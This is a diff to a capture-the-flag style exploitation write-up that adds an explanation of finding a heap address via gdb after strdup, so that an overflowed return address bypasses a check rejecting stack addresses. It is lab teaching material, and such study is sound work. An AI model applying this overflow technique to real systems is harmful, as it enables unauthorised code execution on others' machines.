@@ -147,7 +147,36 @@ address.
 
 ## Find the heap address
 
-Break just after `strdup` returns:
+We need a return address that does not start with `0xb`, because the program
+blocks stack addresses. The useful address is the heap copy created by
+`strdup`.
+
+In the dump, this is the relevant part:
+
+```asm
+0x08048532 <+94>:  lea    eax,[ebp-0x4c]
+0x08048535 <+97>:  mov    DWORD PTR [esp],eax
+0x08048538 <+100>: call   0x80483e0 <strdup@plt>
+0x0804853d <+105>: leave
+0x0804853e <+106>: ret
+```
+
+Just before the call, the program puts the address of our stack buffer in
+`[esp]`, which is the first argument to `strdup`.
+
+So this is equivalent to:
+
+```c
+strdup(buffer);
+```
+
+`strdup` allocates a new buffer on the heap, copies our input into it, and
+returns the address of that heap copy.
+
+On 32-bit x86, a function return value is stored in `eax`. Therefore, right
+after `strdup` returns, `eax` contains the heap address we need.
+
+Break just after `strdup` returns, at `p+105`:
 
 ```gdb
 break *p+105
@@ -164,8 +193,21 @@ Breakpoint 1, 0x0804853d in p ()
 $1 = 0x804a008
 ```
 
-`strdup` returns the heap address of the copied input in `eax`. Because ASLR is
-disabled in the VM, this address is stable for the exploit.
+So the copied input starts at:
+
+```text
+0x0804a008
+```
+
+This address is valid for the exploit because:
+
+```text
+0x0804a008 starts with 0x08, so it passes the anti-stack check
+0xbffffbdc starts with 0xb, so a direct stack return would be rejected
+```
+
+Because ASLR is disabled in the VM, the heap address is stable between runs.
+That is why the payload overwrites the saved return address with `0x0804a008`.
 
 ## Exploitation
 
